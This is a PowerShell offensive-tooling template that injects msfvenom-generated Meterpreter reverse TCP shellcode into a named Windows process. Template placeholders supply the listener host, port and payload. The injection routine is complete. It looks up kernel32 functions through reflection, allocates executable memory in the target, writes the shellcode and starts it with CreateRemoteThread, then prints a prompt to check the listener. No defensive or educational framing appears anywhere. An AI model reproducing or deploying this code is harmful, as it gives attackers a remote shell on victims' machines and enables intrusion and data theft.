# PowerShell Process Injection Template
# Technique: Classic Remote Process Injection via CreateRemoteThread
# Target: {{ target_process }}
# Payload: Meterpreter reverse TCP ({{ lhost }}:{{ lport }})

# Helper function to resolve Windows API functions dynamically
# Uses reflection to access UnsafeNativeMethods without direct P/Invoke declarations
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

# Create a delegate type dynamically for calling unmanaged functions
# This allows calling native Windows API functions without static P/Invoke signatures
function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Get the Process ID of the target process
$procId = (Get-Process {{ target_process }}).Id

# Meterpreter shellcode generated via msfvenom
# Payload: windows/x64/meterpreter/reverse_tcp
# LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread
{{ powershell_payload }}

# Step 1: Open the target process with full access rights
# C# equivalent: IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, procId);
# PROCESS_ALL_ACCESS = 0x001F0FFF
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
  (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)

# Step 2: Allocate executable memory in the remote process
# C# equivalent: IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
# MEM_COMMIT | MEM_RESERVE = 0x3000
# PAGE_EXECUTE_READWRITE = 0x40
$expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)

# Step 3: Write the shellcode into the allocated memory
# C# equivalent: bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
  (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)         

# Step 4: Create a remote thread in the target process to execute the shellcode
# C# equivalent: IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, 0, [IntPtr]::Zero)

Write-Host "Injected! Check your listener!"
